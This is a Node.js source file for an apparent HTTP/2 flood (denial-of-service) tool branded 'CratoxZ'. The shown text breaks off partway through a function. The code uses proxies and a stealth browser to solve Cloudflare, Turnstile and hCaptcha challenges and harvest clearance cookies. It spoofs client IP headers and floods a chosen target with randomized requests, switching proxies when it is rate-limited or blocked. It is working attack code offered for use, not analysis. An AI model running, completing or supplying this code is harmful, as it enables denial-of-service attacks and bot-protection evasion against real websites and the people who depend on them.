[file content begin]
const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// Helper function to replace page.waitForTimeout
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ANSI color codes for aesthetic terminal output
const COLORS = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  magenta: "\x1b[35m",
  blue: "\x1b[34m",
  white: "\x1b[37m",
  bold: "\x1b[1m"
};

// ASCII art header with your name
const printHeader = () => {
  console.clear();
  console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
  console.log(`${COLORS.cyan}${COLORS.bold}||                 #  CratoxZ's Advanced  #                  ||${COLORS.reset}`);
  console.log(`${COLORS.cyan}${COLORS.bold}||               #  CAPTCHA AND UAM BYPASS  #               ||${COLORS.reset}`);
  console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
};

// Read proxies from file
function loadProxies(proxyFile) {
  try {
    if (!fs.existsSync(proxyFile)) {
      console.log(`${COLORS.red}🛑 Error: Proxy file ${proxyFile} does not exist${COLORS.reset}`);
      process.exit(1);
    }
    const proxyData = fs.readFileSync(proxyFile, 'utf8').trim();
    const proxyList = proxyData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    if (proxyList.length === 0) {
      console.log(`${COLORS.red}🛑 Error: Proxy file ${proxyFile} is empty${COLORS.reset}`);
      process.exit(1);
    }
    console.log(`${COLORS.green}✅ CratoxZ: Loaded ${proxyList.length} proxies from ${proxyFile}${COLORS.reset}`);
    return proxyList;
  } catch (err) {
    console.log(`${COLORS.red}🛑 Error reading proxy file ${proxyFile}: ${err.message}${COLORS.reset}`);
    process.exit(1);
  }
}

// Enhanced TLS Configuration for better bypass
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = [
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'TLS_AES_128_GCM_SHA256',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-ECDSA-CHACHA20-POLY1305',
  'ECDHE-RSA-CHACHA20-POLY1305',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha512"
];

const ecdhCurve = "X25519:P-256:P-384:P-521";
const secureOptions = 
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
  crypto.constants.SSL_OP_NO_TICKET;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
  ciphers: ciphers,
  sigalgs: sigalgs.join(':'),
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
});

// Enhanced headers arrays for better bypass
const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
];

const cache_header = [
  'no-cache',
  'max-age=0',
  'no-cache, no-store, must-revalidate',
  'no-store',
  'no-cache, no-store, private, max-age=0',
  'private, max-age=0'
];

const language_header = [
  'en-US,en;q=0.9',
  'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-GB,en;q=0.9',
  'en-US,en;q=0.8,fr;q=0.7',
  'en;q=0.9'
];

// Parse arguments
if (process.argv.length < 5) {
  printHeader();
  console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}  Usage:${COLORS.reset}`);
  console.log(`${COLORS.white}    node captcha2.js <target> <rate> <threads> <proxyFile>${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}------------------------------------------------------------${COLORS.reset}`);
  console.log(`${COLORS.yellow}${COLORS.bold}  Example:${COLORS.reset}`);
  console.log(`${COLORS.white}    node captcha2.js https://example.com 5 4 proxy.txt${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}\n`);
  process.exit(1);
}

const args = {
  target: process.argv[2],
  Rate: parseInt(process.argv[3]),
  threads: parseInt(process.argv[4]),
  proxyFile: process.argv[5]
};

// Load proxies from file
const proxies = loadProxies(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Track failed proxies
global.failedProxies = new Set();

// Proxy index for sequential selection
global.proxyIndex = 0;

// Enhanced Flood function with improved bypass
function flood(userAgent, cookie, proxy) {
  try {
    console.log(`${COLORS.cyan} CratoxZ: Flooding with proxy ${proxy}...${COLORS.reset}`);
    let parsed = url.parse(args.target);
    let path = parsed.path;
    
    // Use random path variations to avoid pattern detection
    const pathVariations = [
      path,
      path + (path.includes('?') ? '&' : '?') + '_=' + Date.now(),
      path + (path.includes('?') ? '&' : '?') + 'cache=' + Math.random().toString(36).substring(7)
    ];
    
    path = pathVariations[Math.floor(Math.random() * pathVariations.length)];
    
    const proxyParts = proxy.split(':');
    const [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts.length === 4 ? proxyParts : [proxyParts[0], proxyParts[1], null, null];
    
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    let interval = 800; // Reduced from 1000ms for higher RPS
    
    function getChromeVersion(userAgent) {
      const chromeVersionRegex = /Chrome\/([\d.]+)/;
      const match = userAgent.match(chromeVersionRegex);
      return match ? match[1] : "126";
    }
    
    const chromever = getChromeVersion(userAgent);
    
    const randValue = function(list) { 
      return list[Math.floor(Math.random() * list.length)]; 
    };
    
    const lang_header1 = [
      "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
      "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
      "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
      "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
      "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
      "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
    ];
    
    // Enhanced headers for better CAPTCHA/UAM bypass
    let fixed = {
      ":method": "GET",
      ":authority": parsed.host,
      ":scheme": "https",
      ":path": path,
      "user-agent": userAgent,
      "upgrade-insecure-requests": "1",
      "sec-fetch-site": randValue(["same-origin", "none", "cross-site"]),
      "sec-fetch-mode": randValue(["navigate", "cors", "no-cors"]),
      "sec-fetch-user": "?1",
      "sec-fetch-dest": randValue(["document", "empty", "iframe"]),
      "cookie": cookie,
      "accept": randValue(accept_header),
      "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Google Chrome";v="${chromever}"`,
      "sec-ch-ua-mobile": randValue(["?0", "?1"]),
      "sec-ch-ua-platform": randValue(['"Windows"', '"macOS"', '"Linux"', '"Android"']),
      "accept-encoding": "gzip, deflate, br, zstd",
      "accept-language": randValue(lang_header1),
      "priority": randValue(["u=0, i", "u=1, i", "u=2, i"]),
      "te": "trailers",
      "dnt": randValue(["1", "0"]),
      "referer": parsed.protocol + "//" + parsed.host + "/"
    };
    
    // Enhanced random headers for bypass
    let randomHeaders = {
      "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      "x-request-id": crypto.randomBytes(16).toString('hex'),
      "x-cache": randValue(["MISS", "HIT", "BYPASS"]),
      "x-requested-with": Math.random() < 0.3 ? "XMLHttpRequest" : undefined,
      "x-csrf-token": Math.random() < 0.2 ? crypto.randomBytes(8).toString('hex') : undefined
    };
    
    let headerPositions = [
      "accept-language",
      "sec-fetch-user",
      "sec-ch-ua-platform",
      "accept",
      "sec-ch-ua",
      "sec-ch-ua-mobile",
      "accept-encoding",
      "priority"
    ];
    
    let headersArray = Object.entries(fixed);
    let shuffledRandomHeaders = Object.entries(randomHeaders)
      .filter(([_, value]) => value !== undefined)
      .sort(() => Math.random() - 0.5);
    
    shuffledRandomHeaders.forEach(([key, value]) => {
      let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
      let index = headersArray.findIndex(([k, _]) => k === insertAfter);
      if (index !== -1) {
        headersArray.splice(index + 1, 0, [key, value]);
      } else {
        headersArray.push([key, value]);
      }
    });
    
    // Shuffle headers order
    headersArray = headersArray.sort(() => Math.random() - 0.5);
    
    let dynHeaders = {};
    headersArray.forEach(([key, value]) => {
      dynHeaders[key] = value;
    });
    
    // Enhanced TLS options
    const secureOptionsList = [
      crypto.constants.SSL_OP_NO_RENEGOTIATION,
      crypto.constants.SSL_OP_NO_TICKET,
      crypto.constants.SSL_OP_NO_SSLv2,
      crypto.constants.SSL_OP_NO_SSLv3,
      crypto.constants.SSL_OP_NO_COMPRESSION,
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
      crypto.constants.SSL_OP_TLSEXT_PADDING,
      crypto.constants.SSL_OP_ALL
    ];
    
    function createTunneledConnection(parsed, proxy) {
      return new Promise((resolve, reject) => {
        const proxyParts = proxy.split(':');
        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1]);
        const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
        const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
        
        const socket = net.connect({
          host: proxyHost,
          port: proxyPort,
          timeout: 10000
        });
        
        socket.on('connect', () => {
          let connectRequest = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n`;
          connectRequest += `Connection: keep-alive\r\n`;
          connectRequest += `Proxy-Connection: keep-alive\r\n`;
          
          if (proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
          }
          
          connectRequest += '\r\n';
          socket.write(connectRequest);
          
          let responseData = '';
          socket.on('data', (data) => {
            responseData += data.toString();
            if (responseData.indexOf('\r\n\r\n') !== -1) {
              if (responseData.match(/^HTTP\/1\.[0-1] 200/)) {
                // Enhanced TLS options for bypass
                const tlsSocket = tls.connect({
                  socket: socket,
                  servername: parsed.host,
                  minVersion: "TLSv1.2",
                  maxVersion: "TLSv1.3",
                  ALPNProtocols: ["h2", "http/1.1"],
                  rejectUnauthorized: false,
                  sigalgs: sigalgs.join(':'),
                  ecdhCurve: ecdhCurve,
                  ciphers: ciphers,
                  secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)],
                  secureContext: secureContext
                }, () => {
                  resolve(tlsSocket);
                });
                
                tlsSocket.on('error', (err) => {
                  socket.destroy();
                  reject(new Error(`TLS error: ${err.message}`));
                });
              } else {
                socket.destroy();
                reject(new Error(`Proxy rejected CONNECT request: ${responseData.split('\r\n')[0]}`));
              }
            }
          });
          
          socket.on('error', (err) => {
            reject(new Error(`Socket error: ${err.message}`));
          });
        });
        
        socket.on('error', (err) => {
          reject(new Error(`Socket connection error: ${err.message}`));
        });
        
        socket.setTimeout(10000, () => {
          socket.destroy();
          reject(new Error('Proxy connection timeout'));
        });
      });
    }
    
    console.log(`${COLORS.blue} CratoxZ: Creating TLS socket for proxy ${proxy}...${COLORS.reset}`);
    createTunneledConnection(parsed, proxy).then((tlsSocket) => {
      const client = http2.connect(parsed.href, {
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
          enablePush: false,
          initialWindowSize: 6291456,
          maxConcurrentStreams: 1000,
          maxFrameSize: 16384,
          maxHeaderListSize: 65536
        }
      }, (session) => {
        session.setLocalWindowSize(12517377 + 65535);
      });
      
      client.on("connect", () => {
        console.log(`${COLORS.green} CratoxZ: HTTP/2 connected with proxy ${proxy}${COLORS.reset}`);
        let clearr = setInterval(() => {
          for (let i = 0; i < args.Rate; i++) {
            try {
              const request = client.request(dynHeaders, {
                weight: Math.random() < 0.5 ? 42 : 256,
                exclusive: false
              });
              
              request.setTimeout(5000, () => {
                request.close();
              });
              
              request.on('response', (headers) => {
                const status = headers[':status'];
                if (status === 429) {
                  console.log(`${COLORS.yellow} CratoxZ: Received 429 from target with proxy ${proxy}, switching proxy${COLORS.reset}`);
                  global.failedProxies.add(proxy);
                  clearInterval(clearr);
                  client.destroy();
                  tlsSocket.destroy();
                } else if (status === 403) {
                  console.log(`${COLORS.yellow} CratoxZ: Received 403 from target with proxy ${proxy}, marking as failed${COLORS.reset}`);
                  global.failedProxies.add(proxy);
                  clearInterval(clearr);
                  client.destroy();
                  tlsSocket.destroy();
                } else if (status === 200 || status === 201 || status === 204) {
                  // Success - count request
                  if (process.send) process.send('request');
                }
                request.close();
              });
              
              request.on('error', (err) => {
                if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                  // Ignore stream refusal errors
                }
              });
              
              request.end();
            } catch (reqErr) {
              // Ignore request errors
            }
          }
        }, interval);
        
        let goawayCount = 0;
        client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
          clearInterval(clearr);
          let backoff = Math.min(1000 * Math.pow(2, goawayCount), 10000);
          console.log(`${COLORS.yellow} CratoxZ: GOAWAY received for proxy ${proxy}, retrying after ${backoff}ms${COLORS.reset}`);
          setTimeout(() => {
            goawayCount++;
            client.destroy();
            tlsSocket.destroy();
            if (!global.failedProxies.has(proxy)) {
              flood(userAgent, cookie, proxy);
            }
          }, backoff);
        });
        
        client.on("close", () => {
          clearInterval(clearr);
          client.destroy();
          tlsSocket.destroy();
          console.log(`${COLORS.blue} CratoxZ: Connection closed for proxy ${proxy}${COLORS.reset}`);
          if (!global.failedProxies.has(proxy)) {
            setTimeout(() => flood(userAgent, cookie, proxy), 1000);
          }
        });
        
        client.on("error", (err) => {
          clearInterval(clearr);
          if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
            console.log(`${COLORS.red} CratoxZ: Client error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
          }
          client.destroy();
          tlsSocket.destroy();
          if (!global.failedProxies.has(proxy)) {
            setTimeout(() => flood(userAgent, cookie, proxy), 2000);
          }
        });
      });
      
      client.on("error", (err) => {
        if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
          console.log(`${COLORS.red} CratoxZ: Client connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
        }
        client.destroy();
        tlsSocket.destroy();
      });
      
    }).catch((err) => {
      console.log(`${COLORS.red} CratoxZ: Connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
      global.failedProxies.add(proxy);
    });
  } catch (err) {
    console.log(`${COLORS.red} CratoxZ: Error in flood function with proxy ${proxy}: ${err.message}${COLORS.reset}`);
    global.failedProxies.add(proxy);
  }
}

// Helper functions
function getNextProxy(arr) {
  let start = global.proxyIndex || 0;
  for (let i = start; i < start + arr.length; i++) {
    let idx = i % arr.length;
    let item = arr[idx];
    if (!global.failedProxies.has(item.proxy ? item.proxy : item)) {
      global.proxyIndex = (idx + 1) % arr.length;
      let proxyStr = item.proxy ? item.proxy : item;
      console.log(`${COLORS.blue} CratoxZ: Selected proxy ${proxyStr} (${global.proxyIndex}/${proxies.length})${COLORS.reset}`);
      return item;
    }
  }
  console.log(`${COLORS.red} CratoxZ: No available proxies left!${COLORS.reset}`);
  return null;
}

function randstr(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters[Math.floor(Math.random() * characters.length)];
  }
  return result;
}

function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = [];
  for (let i = keys.length - 1; i >= 0; i--) {
    const randomIndex = Math.floor(Math.random() * (i + 1));
    shuffledKeys[i] = shuffledKeys[randomIndex];
    shuffledKeys[randomIndex] = keys[i];
  }
  const result = {};
  shuffledKeys.forEach((key) => {
    if (key) result[key] = obj[key];
  });
  return result;
}

// Enhanced Cloudflare Bypass with CAPTCHA and UAM support
function bypassCloudflareOnce(attemptNum) {
  if (typeof attemptNum === 'undefined') attemptNum = 1;
  let response = null;
  let browser = null;
  let page = null;
  const maxRetries = 3;
  let retryCount = 0;
  let proxy = null;
  
  function tryBypass(resolve, reject) {
    proxy = getNextProxy(proxies);
    if (!proxy) {
      console.log(`${COLORS.red} CratoxZ: No valid proxies available for bypass attempt #${attemptNum}!${COLORS.reset}`);
      resolve({
        cookies: [],
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        cfClearance: null,
        success: false,
        attemptNum: attemptNum,
        proxy: null
      });
      return;
    }
    
    const proxyParts = proxy.split(':');
    const proxyHost = proxyParts[0];
    const proxyPort = proxyParts[1];
    const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
    const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
    
    try {
      console.log(`${COLORS.yellow} CratoxZ: Starting bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) using proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
      
      // Enhanced browser options for better bypass
      const connectOptions = {
        headless: false, // Keep false for better bypass
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu',
          '--disable-blink-features=AutomationControlled',
          '--disable-features=IsolateOrigins,site-per-process',
          '--disable-web-security',
          '--disable-features=BlockInsecurePrivateNetworkRequests',
          '--window-size=1920,1080',
          '--lang=en-US',
          `--proxy-server=http://${proxyHost}:${proxyPort}`,
          '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ],
        turnstile: true, // Enable Turnstile CAPTCHA support
        connectOption: {
          defaultViewport: null,
          ignoreHTTPSErrors: true
        }
      };
      
      if (proxyUser && proxyPass) {
        connectOptions.args.push(`--proxy-auth=${proxyUser}:${proxyPass}`);
      }
      
      connect(connectOptions).then((resp) => {
        response = resp;
        browser = response.browser;
        page = response.page;
        
        // Inject stealth scripts to avoid detection
        page.evaluateOnNewDocument(() => {
          // Overwrite navigator properties
          Object.defineProperty(navigator, 'webdriver', {
            get: () => undefined
          });
          
          Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
          });
          
          Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5]
          });
          
          // Overwrite chrome property
          window.chrome = {
            runtime: {}
          };
          
          // Add missing permissions
          const originalQuery = window.navigator.permissions.query;
          window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
              Promise.resolve({ state: Notification.permission }) :
              originalQuery(parameters)
          );
        });
        
        console.log(`${COLORS.blue} CratoxZ: Accessing ${args.target} through proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
        
        page.goto(args.target, { 
          waitUntil: 'networkidle2',
          timeout: 180000 // Increased timeout for CAPTCHA solving
        }).then(async () => {
          console.log(`${COLORS.yellow} CratoxZ: Checking Cloudflare challenge for ${proxy}...${COLORS.reset}`);
          
          let challengeCompleted = false;
          let checkCount = 0;
          const maxChecks = 180; // Increased for CAPTCHA
          
          async function checkChallenge() {
            if (challengeCompleted || checkCount >= maxChecks) {
              setTimeout(async () => {
                try {
                  const cookies = await page.cookies();
                  console.log(`${COLORS.cyan} CratoxZ: Found ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}${COLORS.reset}`);
                  
                  const cfClearance = cookies.find((c) => c.name === "cf_clearance");
                  if (cfClearance) {
                    console.log(`${COLORS.green} CratoxZ: cf_clearance obtained: ${cfClearance.value.substring(0, 30)}...${COLORS.reset}`);
                  }
                  
                  // Check for other Cloudflare cookies
                  const cfBm = cookies.find((c) => c.name === "__cf_bm");
                  if (cfBm) {
                    console.log(`${COLORS.green} CratoxZ: __cf_bm obtained${COLORS.reset}`);
                  }
                  
                  const userAgent = await page.evaluate(() => navigator.userAgent);
                  
                  await page.close();
                  await browser.close();
                  
                  resolve({
                    cookies: cookies,
                    userAgent: userAgent,
                    cfClearance: cfClearance ? cfClearance.value : null,
                    success: true,
                    attemptNum: attemptNum,
                    proxy: proxy
                  });
                } catch (error) {
                  console.log(`${COLORS.red} CratoxZ: Error retrieving cookies: ${error.message}${COLORS.reset}`);
                  resolve({
                    cookies: [],
                    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    cfClearance: null,
                    success: false,
                    attemptNum: attemptNum,
                    proxy: proxy
                  });
                }
              }, 2000);
              return;
            }
            
            setTimeout(async () => {
              try {
                // Check for CAPTCHA elements
                const hasCaptcha = await page.evaluate(() => {
                  // Check for Cloudflare CAPTCHA
                  if (document.querySelector('#cf-challenge-running') || 
                      document.querySelector('.challenge-form') ||
                      document.title.includes('Just a moment') ||
                      document.title.includes('Checking your browser')) {
                    return true;
                  }
                  
                  // Check for Turnstile CAPTCHA
                  if (document.querySelector('[data-sitekey]') || 
                      document.querySelector('.cf-turnstile')) {
                    return true;
                  }
                  
                  // Check for hCaptcha
                  if (document.querySelector('.h-captcha') ||
                      document.querySelector('[data-hcaptcha-widget-id]')) {
                    return true;
                  }
                  
                  return false;
                });
                
                if (hasCaptcha) {
                  console.log(`${COLORS.yellow} CratoxZ: CAPTCHA detected, attempting to solve...${COLORS.reset}`);
                  
                  // Try to wait for auto-solve (puppeteer-real-browser should handle this)
                  await delay(5000);
                  
                  // Check if CAPTCHA was solved
                  const cookies = await page.cookies();
                  const cfClearance = cookies.find((c) => c.name === "cf_clearance");
                  
                  if (cfClearance) {
                    console.log(`${COLORS.green} CratoxZ: CAPTCHA solved! Got cf_clearance${COLORS.reset}`);
                    challengeCompleted = true;
                    checkChallenge();
                    return;
                  }
                }
                
                // Normal challenge check
                const cookies = await page.cookies();
                const cfClearance = cookies.find((c) => c.name === "cf_clearance");
                
                if (cfClearance) {
                  console.log(`${COLORS.green} CratoxZ: Challenge completed after ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}!${COLORS.reset}`);
                  challengeCompleted = true;
                  checkChallenge();
                  return;
                }
                
                // Check if page has loaded normally
                const pageStatus = await page.evaluate(() => {
                  const title = (document.title || "").toLowerCase();
                  const bodyText = (document.body && document.body.innerText || "").toLowerCase();
                  
                  // Check for challenge indicators
                  if (title.includes("just a moment") || 
                      title.includes("checking") ||
                      bodyText.includes("checking your browser") ||
                      bodyText.includes("please wait") ||
                      bodyText.includes("cloudflare") ||
                      bodyText.includes("ddos protection")) {
                    return false;
                  }
                  
                  // Check for CAPTCHA page
                  if (document.querySelector('form[action*="captcha"]') || 
                      document.querySelector('iframe[src*="challenges.cloudflare.com"]')) {
                    return false;
                  }
                  
                  // Check if page has content
                  return document.body && document.body.children.length > 3;
                });
                
                challengeCompleted = pageStatus;
                checkCount++;
                
                if (checkCount % 10 === 0) {
                  console.log(`${COLORS.yellow} CratoxZ: Still checking... (${(checkCount * 0.5).toFixed(1)}s elapsed) for proxy ${proxy}${COLORS.reset}`);
                }
                
                checkChallenge();
              } catch (evalError) {
                console.log(`${COLORS.red} CratoxZ: Evaluation error: ${evalError.message}${COLORS.reset}`);
                checkCount++;
                checkChallenge();
              }
            }, 500);
          }
          
          checkChallenge();
        }).catch((navError) => {
          console.log(`${COLORS.yellow} CratoxZ: Navigation error for proxy ${proxy}: ${navError.message}${COLORS.reset}`);
          
          if (navError.message.includes("net::ERR_INVALID_AUTH_CREDENTIALS") || 
              navError.message.includes("net::ERR_PROXY_CONNECTION_FAILED") ||
              navError.message.includes("timeout")) {
            global.failedProxies.add(proxy);
          }
          
          retryCount++;
          
          if (browser) {
            browser.close().catch(() => {});
          }
          
          if (retryCount < maxRetries) {
            setTimeout(() => tryBypass(resolve, reject), 2000);
          } else {
            resolve({
              cookies: [],
              userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
              cfClearance: null,
              success: false,
              attemptNum: attemptNum,
              proxy: proxy
            });
          }
        });
      }).catch((error) => {
        console.log(`${COLORS.red} CratoxZ: Browser connection failed for proxy ${proxy}: ${error.message}${COLORS.reset}`);
        global.failedProxies.add(proxy);
        retryCount++;
        
        if (retryCount < maxRetries) {
          setTimeout(() => tryBypass(resolve, reject), 2000);
        } else {
          resolve({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum,
            proxy: proxy
          });
        }
      });
    } catch (error) {
      console.log(`${COLORS.red} CratoxZ: Bypass setup error: ${error.message}${COLORS.reset}`);
      global.failedProxies.add(proxy);
      retryCount++;
      
      if (retryCount < maxRetries) {
        setTimeout(() => tryBypass(resolve, reject), 2000);
      } else {
        resolve({
          cookies: [],
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          cfClearance: null,
          success: false,
          attemptNum: attemptNum,
          proxy: proxy
        });
      }
    }
  }
  
  return new Promise((resolve, reject) => {
    tryBypass(resolve, reject);
  });
}

function bypassCloudflareParallel() {
  return new Promise((resolve, reject) => {
    console.log(`${COLORS.magenta} CratoxZ: Starting Cloudflare Bypass (Unlimited Mode)${COLORS.reset}`);
    const results = [];
    let attemptCount = 0;
    const concurrentBypassSessions = Math.min(5, proxies.length); // Reduced for stability
    
    function runBatch() {
      // Check if there are any proxies left that haven't failed
      const availableProxies = proxies.filter(proxy => !global.failedProxies.has(proxy));
      if (availableProxies.length === 0) {
        console.log(`${COLORS.red} CratoxZ: No more available proxies. Stopping bypass attempts.${COLORS.reset}`);
        if (results.length === 0) {
          console.log(`${COLORS.yellow} CratoxZ: No Cloudflare cookies obtained, using default header${COLORS.reset}`);
          results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true,
            proxy: null
          });
        }
        console.log(`\n${COLORS.green} CratoxZ: Total sessions obtained: ${results.length}${COLORS.reset}`);
        resolve(results);
        return;
      }
      
      const currentBatchSize = Math.min(concurrentBypassSessions, availableProxies.length);
      console.log(`\n${COLORS.yellow} CratoxZ: Starting parallel batch (${currentBatchSize} sessions, ${availableProxies.length} proxies remaining)...${COLORS.reset}`);
      
      const batchPromises = [];
      for (let i = 0; i < currentBatchSize; i++) {
        attemptCount++;
        batchPromises.push(bypassCloudflareOnce(attemptCount));
      }
      
      Promise.allSettled(batchPromises).then((batchResults) => {
        batchResults.forEach((result, index) => {
          if (result.status === 'fulfilled' && result.value.success && result.value.cookies.length > 0) {
            results.push(result.value);
            console.log(`${COLORS.green} CratoxZ: Session #${result.value.attemptNum} successful with proxy ${result.value.proxy}! (Total: ${results.length})${COLORS.reset}`);
          } else {
